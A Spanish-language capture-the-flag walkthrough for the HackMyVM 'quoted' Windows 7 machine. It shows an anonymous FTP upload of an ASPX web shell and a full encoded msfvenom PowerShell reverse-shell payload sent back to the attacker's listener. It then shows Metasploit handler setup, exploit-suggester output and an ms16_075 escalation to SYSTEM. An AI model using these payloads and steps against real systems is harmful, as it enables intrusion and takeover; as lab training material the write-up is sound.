---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# quoted HackMyVM (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 12:19 EDT
Nmap scan report for 192.168.28.10
Host is up (0.00031s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-05-24  12:16PM       <DIR>          aspnet_client
| 10-05-24  12:27AM                  689 iisstart.htm
|_10-05-24  12:27AM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:4C:C7:38 (Oracle VirtualBox virtual NIC)
Service Info: Host: QUOTED-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: quoted-PC
|   NetBIOS computer name: QUOTED-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-31T19:20:51+03:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: QUOTED-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:4c:c7:38 (Oracle VirtualBox virtual NIC)
|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-03-31T16:20:51
|_  start_date: 2025-03-31T16:13:20

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.00 seconds
```

Vemos varias cosas interesantes, como por ejemplo una pagina web, un `FTP`, un servidor `SMB` entre otras cosas, si probamos a entrar en el puerto `80` veremos una pagina web por defecto de `Windows Server`:

<figure><img src="../../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

Por lo que vamos a investigar el puerto `21` (`FTP`).

## FTP

```shell
ftp anonymous@<IP>
```

Vemos que nos deja entrar de forma anonima sin proporcionar ninguna contraseña, y si listamos veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
10-05-24  12:16PM       <DIR>          aspnet_client
10-05-24  12:27AM                  689 iisstart.htm
10-05-24  12:27AM               184946 welcome.png
226 Transfer complete.
```

Vemos que la pagina web del puerto `80` se esta alojando desde el `FTP` por lo que si subimos algo en el `FTP` se proporcionara en el puerto `80`, por lo que vamos a crear un `cmd.aspx` para poder ejecutar comando en el sistema de forma remota (`RCE`).

> cmd.aspx

```aspx
```

Desde el servidor `FTP` subiremos el archivo de la siguiente forma:

```shell
put cmd.aspx
```

Info:

```
local: cmd.aspx remote: cmd.aspx
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
100% |****************************************************************************************************************|  1379       25.29 MiB/s    --:-- ETA
226 Transfer complete.
1379 bytes sent in 00:00 (2.19 MiB/s)
```

Y ahora si accedemos a la siguiente ruta:

```
URL = http://<IP>/cmd.aspx
```

Veremos que funciona y veremos la pagina que hemos subido, ahora probaremos a meter un `whoami` para ver si se ejecuta.

<figure><img src="../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Vemos que se ejecuta de forma correcta, por lo que nos vamos a crear una `reverse shell` de la siguiente forma con `msfvenom`.

### Metasploit (Shell)

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f psh-cmd -o payload.txt
```

Esto nos dara como resultado lo siguiente:

```
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEAQgB2AEYANgBtAGMAQwBBADcAVgBXAGIAVwAvAGEAUwBCAEQAKwBYAHEAbgAvAHcAYQBxAFEATQBDAHIAQgBoAHQAQwAwAGkAVgBUAHAAMQBqAFkARQBrAGsAQgBNAEgAQwBCACcAJwArACcAJwBBADAAVwBsAGoATAAvAGEARwB0AFoAZgBZAFMAeAB7ADEAfQBuADEALwA5ACsAcwB4AGkASAA5AEoATAAwAGMAaQBmAFYARQBzAG0AKwB6AE0AegBPAFAAdgBQACcAJwArACcAJwBNAHoAQwA3AFcAawBTAHMAbwBqADUAUwBzAG8AMwB4AC8ALwAwADcAWgBmAGoAYQBPAGMAYQBpAG8AcABkAHUAYgAnACcAKwAnACcAegBIAEsAcgBTAGkAawA0AHEATwB3ADIAUwA5AGwAMQBSAC8AbQBxAHEARABPADAAVwBsAGsAewAnACcAKwAnACcAMgB9AHgARABTAGEASAB4ADIAWgA2AHoAZwBtAGsAYwBqAG4AdABXAE0AaQBVAEoASwBRAHsAMgB9AEoAcABSAGsAcQBnAFYANQBTADkAbABIAEoAQwBZADcASgAxAGYAMwB4AEIAWABLAE4AKwBWADAAcAArADEAWQAnACcAKwAnACcAewAyAH0AYQB2AE0AZAB1AEsAWgBTAFoAMgBBADYATABzAG8AYwBpAFQAZQAyAGYAYwB4AGQASwB0AG0AcgBOAGkAVgBLAGoAbABiADkALwBLAGwAZABsAGUAZgBWADUAcgAzAGEANAB4AFMAOQBTAHsAMQB9AGsAewAxAH0AVwBDAGgARABXAFAAcwBYAEoARgArAFYARwBSAEIAMQA1AG0ASwA2AEsAVwBlADkAUwBOAGUAYwBJAFgAbwBqAGEAbQAwAFgANgBqAE4AbwB3AFMAdgBDAEIAOQBzAEgAWgBIAGUAawBRAEUAMwBFAHYASwBjAEoAZgBkAGIAVwBJAGkAMQBuAEcAMAB1AFoAUwAwAGsAcwB1AG8AWgBSAGoAYQBNAFgAZQBSADUAewAyAH0AVQBrAFMAYwBwAFYAWgBTAGIAdAB6ACsAYgB6AFAAOQBUAFoAOQB2AEMATABkAFMAUgBvAFMARwByAGQAUwBKAEMAWQByAHgAdwBTADMAMQBHAFgASgBMAFUATwBqAGoAeABHAEwAcwBoAGkARABsAHEATwBpAEcAbgBrAHoAewAxAH0AcwBWAEUATAB2AGoAUwA2AEsAVwBvAGoAVgBqAFYAZQBXAC8AbQBGAEgANwBKAEMAMgBnAGUANgB1AFMAKwBsAFEASgBwAEcAdwBSAFYANgBvAFEAMABlAGYAWAA3AEgARgB2AHoAVQBpAHUAVwBIADcAQgB6ADUAdwBFAEYAZgBoAHsAMQB9AEkAZwBCADYAUAB7ADEAfQBTAEEAaQA0AEkANgBpAC8AQwAyAFoAYgAvACcAJwArACcAJwBBAG4AdAAxAEMAewAyAH0AYwAwADIATwB3ACcAJwArACcAJwBSAGMAVgBtADIAZQAwAEkAMwAyAFYAMABXAHYASwBqADAANABIAFEAcwBlAFoAegBBAHQAWABjAFoAcgBVAHAAawAvAEEAcQA2AFUAewAyAH0ARQBQADEAcgBiAGIAcQBoAFMASwBvAGUAUwBNAGQAVgBtAFkAagBUAHIAMwA1AFQAdgArAG4ANABKAGMAZQAwAG8ATwArADEAUABzAEYAbAB7ADEAfQAyAHsAMQB9AG8AQgBHAHgAcwBnAGkASAAxAEMAMwBvAHEAcgA0AFUARQA3AEoAZwBaAEEATgBKAHIAUgBEAHIAZwA0AGQAcQBlAGIAdABCAFAASQBzAHcANABtAE0AaABZAFoAYgBVAGUASwBiAFcAQwBxAGwANAAxAEQAWABXAGwASABrAGsAUgBpADcARQBOAFEARwB2AEkATwBTAFYAbgA1ADMASgBJADYAZQBXAHUAMQBHAFAAaABBAEIAZQBQAGcAZQB1AGwAaABhAFEASgBLAFMAUQAzAGkAWgBHAFYAcAB3AHUANQB7ADEAfQBCAFUATgBoAGwATwBrAHEAcABpAHIAewAxAH0ARgBMAEkAYwBrAGQAZwBoAG4AeABxAGcAcQBLAEUAcgByAGQAUQBtAHYAQgBOAHsAMgB9AFAAewAxAH0AegB0ADMAZQBtAGcAbgBxADQAawBRAFUANQB1AGEAVgBmACsASwA1AFAAZABmAGsAVQBTAEwAaQB0AFEAdAB4AEIAUQB3AHUAbgBSAFYAeABLAFcAWQBTAGsAcQByAFMAbwBSADQAeABNAG8AZgA2AHgAZgBuAGwARgB3AEUAeABNAFcATwBRAFAAbQBEAHAARABnAEkAQwBLAHgASQBJAFIAMABpADIAeABPAEEAcQBNAEsATgBTAGMANAAnACcAKwAnACcAagBvAGgAaQB0AEcAUQBwAEQAWQBGAEkAMAAyAHcAegA2AFUAaQBHADIASwBiAE0AaQBGAGYAZQBLAFYAWAAvAE8AegB7ADEAfQBJAFcAYwArAEIASwBaAEEAcABJAG4AWABrAEsANABIAGMAWgBGAFYAUgBuAFIAVwBFAEEATgBrAGkAZwBEAHcAZgA2AEgARAB7ADIAfQA5AEwAVAArADYATQBHAFoATgB0AGMATgBRAGkAeABXAFoARwBKAG0AUQBLAGwATwA1AHYASgBFAGUAMwArAEcAegBRAGkAQQAnACcAKwAnACcAVQBnADAAWQA1ADUAYQBPAEMARQBIAEQAVAB6AE0AcQBOACsAMABNADYAcABqAGUAQwBiAFcAQgAyAEgAawB0AEcAUwAxAHIAcwBwAC8ASAByAHcARwAxAHEAZgB2AGQATQBUAEwAcgBKAFQAcQA2AFAAMQBYAEQATwB4AGoAOQB0AGYAJwAnACsAJwAnAEUARQAzADkAMQBQADMAUwBSADYANQAzADQAcABGAEQAWgA5AFEAVQBUAHEAcwByAFQAQgB0ADEAQgBsAFEAMwBtAG8ARgByADYASgBkAHsAMQB9AFgAUABkACcAJwArACcAJwA5AHEAdgBzAFQANQBQAFUASABnAGMAdAAwAEcAMgB3ADQAawAwAFMAbgBhAFcAZgBjACcAJwArACcAJwBjAHsAMQB9ADMAagAnACcAKwAnACcASQBXADAAawB3AE4AUgBtAHMAMwBPAGwAbwAvADMAOQA1AHYAbQArAHYAZwBUAHMASgBxAEMAMwBCAEoAMgBRAHAAdgBkAG4ATQBJAFoANgAnACcAKwAnACcAZQBuADUAbQBkAEIATgBEADcANwBMAFcAaQBYAGwAeABQAFcANgAwAHAAMgBQAFcAMABaAHIAdABZAEQASABtACcAJwArACcAJwBpAFgATQB3AHMAVABSAE4ATwAvAFMAdwAxAGMAcwBRAE0AcgBpADMAMwB7ADIAfQB1AHUANgBoAGYAewAyAH0AcwB1AE8ARwBSAGoAUABpADIAcQBIAFoAWABLAEkAVwBRAG0AYgBVAEcAcgBVAE4AZgBqAG8AeABZAG0AUgByAEkAKwB7ADEAfQB2AGUASAByAHEAdQB7ADIAfQBiAFkATgA1AEgAeABLAGEAQgBrAE8AaABpADIAagBjAEcAZwBiAGEARABoAHsAMgB9AGMAMgB0AGQAYQBqADUAMgB1AEgANABDAGcAZgBHAGUATgBTAGcAMAA5AFgAVgBSAFEARAB6AGQAdABvAFoAbgBHAHAANgBzACsAdQBSAEIAegA1AE4AQQBiAGgAagBqAHIAQgAvAEEAVABLACsAMgBYACcAJwArACcAJwBDAEQAQgAnACcAKwAnACcAYwBoAFkASAA1AEgAeABzAGMAKwBUAEIAbAA0AGEASABCAGsAZwAwADUANwBlAG8AdQBOAGcAcwBtAHIAYgBEAFAAWQB2ACcAJwArACcAJwBoAHcAMgBPAFIAcQB4AC8AaABkAEgAWgBOAEcAdAByAFcAbgAxAGkATgAxAEYASAA1ACsATgBqAEgAdwAxAEEASABQAHYARwBBAEsAUABrAHoAbgBxAHcAdABQAHIASQA0ADkANwA0AFUAMwArAHsAMQB9ADAARQBaAFgANwBMAE4AbQBtAFEATQA3AHUASgBKADMAMQBsAGEAaAAvAEoAdAAyAHIARgBOADMAVwBrAC8AZAB7ADIAfQB7ADIAfQA5AGYAegBzAFoAMABGAEgASQAwADEATABUAFIAQgA2AEQARQBiAEUAJwAnACsAJwAnAGcAagBzACcAJwArACcAJwBkACsAWQBsADkATABoAGEAVgAvAFcAegBmAGYAdgBTAHIAVAA1ADYAUQBrAHoAWAB1AHMASwBQAFIAdwBuAEEAVwBiAEEARwBLAGoAMwBSAGQANgAyAGUAZAB6AGUAbABuAEMAYgBVADYAbQBoAHEAdgBBAEsAVwBKAEkANABJAGcAdwA2AEoALwBUAFcAZwB1AHsAMQB9AEkATQBlADcASwA5AHAARwBYAGUAdQBoAGQAZQBVAGUAUgBEAFcANwBZADMAVABqADEAMABxAGkAaQBQAEEAcABXAGQAbwAyAGwAVwBEAG8ANgBtAG8ASwBUAGsARQBEADMATgA3AFUAegBFAHYAawBpAHEATwByADMAKwA3AG8ATwBPAGEAWABmADYAewAyAH0AMQBOAHAAcgB6ADkAWQBpAFoAZgBaAFMAcQBZAHEAcwBwADIASQBtAEgASgBEAGIATwBOAFkAYgBCAEYARgA0AHEAcQAvAG0ANgBjADQATQBVAGcAbwBIAEwAOQBBAHEAbgBYAFEASQBPAGoAbAAxAEIAcQBvAFAAVABsAEIAVQBCAEMAWgAzAEQATwBuAGcASwBYADMAKwBxAFIAQgBUAHYAWQBBAEsAewAyAH0ANgAzAEgAbwBtADMAdwBvAGIAYwBvAEQANgBIAHIAbABWAFMAawBKADIAMABxAGUAZAB1AGUAUwBsAFkAZQB0ADMARQBtAFoAYgB4AEEATAA0ADUALwAwAHIAWQBYAFoAcgB2ADkAaAA5AEUANABuADAANgBnAGEAYwBaADYAcwAvAEwAegB4AHAAQQBMAHsAMgB9AE4AZwBEAEcAbQBBAHUAUQBjAHEATQBhAE0ANQBPACsARABWADMARABZADUAcwBpAFQAKwBNAHIAZwBRAEEANABzAHQAcAA5AHsAMgB9AE4AcAArAHYAeABWADQAZgBIAG0ASwBiAGgAdgBBADMAeAB6AGYAUABoAHEAMABMAEEAQQBBAHsAMAB9ACcAJwApAC0AZgAnACcAPQAnACcALAAnACcAeQAnACcALAAnACcAOAAnACcAKQApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA==
```

Pero solo pillaremos a partir de esta parte para delante:

```
powershell.exe -nop -w hidden -e <Base64>
```

Ahora nos pondremos a la escucha desde `metasploit`:

```shell
msfconsole -q
```

Ahora utilizaremos el modulo de escucha:

```shell
use multi/handler
```

Lo configuraremos de la siguiente forma:

```shell
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT <PORT>
set LHOST <IP>
run
```

Ahora nos vamos a nuestro `cmd.aspx` e insertaremos el `payload` que hemos generado con `msfvenom` a partir de la parte que comente anteriormente, una vez enviado, si volvemos a donde tenemos la escucha veremos lo siguiente:

```
[*] Started reverse TCP handler on 192.168.28.5:7777 
[*] Sending stage (177734 bytes) to 192.168.28.10
[*] Meterpreter session 1 opened (192.168.28.5:7777 -> 192.168.28.10:49162) at 2025-03-31 12:41:05 -0400

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

Veremos que ha funcionado de forma correcta, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMV{User_Flag_Obtained}
```

## Privileges Escalation

Vamos a utilizar un modulo en `metasploit` para poder analizar las diferentes vulnerabilidades que pueda tener la maquina `Windows` a nivel local.

Antes vamos a dejar en segundo plano la sesion actual con `Ctrl+Z` y despues dandole a `Y`, ahora utilizaremos lo siguiente:

```shell
use post/multi/recon/local_exploit_suggester
```

Lo configuraremos de la siguiente forma:

```shell
set SESSION <ID_SESSION>
set SHOWDESCRIPTION true
exploit
```

Info:

```
[*] 192.168.28.10 - Collecting local exploits for x86/windows...
[*] 192.168.28.10 - 198 exploit checks are being tried...
[+] 192.168.28.10 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
  This module will bypass Windows UAC by creating COM handler registry 
  entries in the HKCU hive. When certain high integrity processes are 
  loaded, these registry entries are referenced resulting in the 
  process loading user-controlled DLLs. These DLLs contain the 
  payloads that result in elevated sessions. Registry key 
  modifications are cleaned up after payload invocation. This module 
  requires the architecture of the payload to match the OS, but the 
  current low-privilege Meterpreter session architecture can be 
  different. If specifying EXE::Custom your DLL should call 
  ExitProcess() after starting your payload in a separate process. 
  This module invokes the target binary via cmd.exe on the target. 
  Therefore if cmd.exe access is restricted, this module will not run 
  correctly.
[+] 192.168.28.10 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
  This module will bypass Windows UAC by hijacking a special key in 
  the Registry under the current user hive, and inserting a custom 
  command that will get invoked when the Windows Event Viewer is 
  launched. It will spawn a second shell that has the UAC flag turned 
  off. This module modifies a registry key, but cleans up the key once 
  the payload has been invoked. The module does not require the 
  architecture of the payload to match the OS. If specifying 
  EXE::Custom your DLL should call ExitProcess() after starting your 
  payload in a separate process.
[+] 192.168.28.10 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
  This module exploits CVE-2020-0787, an arbitrary file move 
  vulnerability in outdated versions of the Background Intelligent 
  Transfer Service (BITS), to overwrite 
  C:\Windows\System32\WindowsCoreDeviceInfo.dll with a malicious DLL 
  containing the attacker's payload. To achieve code execution as the 
  SYSTEM user, the Update Session Orchestrator service is then 
  started, which will result in the malicious 
  WindowsCoreDeviceInfo.dll being run with SYSTEM privileges due to a 
  DLL hijacking issue within the Update Session Orchestrator Service. 
  Note that presently this module only works on Windows 10 and Windows 
  Server 2016 and later as the Update Session Orchestrator Service was 
  only introduced in Windows 10. Note that only Windows 10 has been 
  tested, so your mileage may vary on Windows Server 2016 and later.
[+] 192.168.28.10 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
  This module exploits the Task Scheduler 2.0 XML 0day exploited by 
  Stuxnet. When processing task files, the Windows Task Scheduler only 
  uses a CRC32 checksum to validate that the file has not been 
  tampered with. Also, In a default configuration, normal users can 
  read and write the task files that they have created. By modifying 
  the task file and creating a CRC32 collision, an attacker can 
  execute arbitrary commands with SYSTEM privileges. NOTE: Thanks to 
  webDEViL for the information about disable/enable.
[+] 192.168.28.10 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  This module exploits a NULL Pointer Dereference in win32k.sys, the 
  vulnerability can be triggered through the use of TrackPopupMenu. 
  Under special conditions, the NULL pointer dereference can be abused 
  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
  module has been tested successfully on Windows XP SP3, Windows 2003 
  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
  and Windows 2008 R2 SP1 64 bits.
[+] 192.168.28.10 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 192.168.28.10 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
  Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. Currently the 
  module does not spawn as SYSTEM, however once achieving a shell, one 
  can easily use incognito to impersonate the token.
[+] 192.168.28.10 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
  This module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. It requires a 
  CLSID string. Windows 10 after version 1803, (April 2018 update, 
  build 17134) and all versions of Windows Server 2019 are not 
  vulnerable.
[+] 192.168.28.10 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
  This module exploits a NULL pointer dereference vulnerability in 
  MNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() 
  system call. The NULL pointer dereference occurs because the 
  xxxMNFindWindowFromPoint() function does not effectively check the 
  validity of the tagPOPUPMENU objects it processes before passing 
  them on to MNGetpItemFromIndex(), where the NULL pointer dereference 
  will occur. This module has been tested against Windows 7 x86 SP0 
  and SP1. Offsets within the solution may need to be adjusted to work 
  with other versions of Windows, such as Windows Server 2008.
[+] 192.168.28.10 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
  This module leverages a UAC bypass (TokenMagic) in order to spawn a 
  process/conduct a DLL hijacking attack to gain SYSTEM-level 
  privileges. Windows 7 through Windows 10 1803 are affected.
[*] Running check method for exploit 42 / 42
[*] 192.168.28.10 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                                              
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

Vemos el siguiente modulo interesante para poder utilizarlo, para explotar la maquina `Windows`.

```
[+] 192.168.28.10 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
  This module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. It requires a 
  CLSID string. Windows 10 after version 1803, (April 2018 update, 
  build 17134) and all versions of Windows Server 2019 are not 
  vulnerable.
```

Lo utilizaremos de la siguiente forma:

```shell
use exploit/windows/local/ms16_075_reflection_juicy
```

Ahora lo configuraremos de la siguiente forma:

```shell
set SESSION <ID_SESSION>
set LPORT <PORT>
set LHOST <IP>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.28.5:7755 
[+] Target appears to be vulnerable (Windows 7 Service Pack 1)
[*] Launching notepad to host the exploit...
[+] Process 2588 launched.
[*] Reflectively injecting the exploit DLL into 2588...
[*] Injecting exploit into 2588...
[*] Exploit injected. Injecting exploit configuration into 2588...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 192.168.28.10
[*] Meterpreter session 2 opened (192.168.28.5:7755 -> 192.168.28.10:49169) at 2025-03-31 12:51:28 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Por lo que vemos ya seremos `Administradores` por lo que leeremos la `flag` del `admin`.

> root.txt

```
HMV{Elevated_Shell_Again}
```
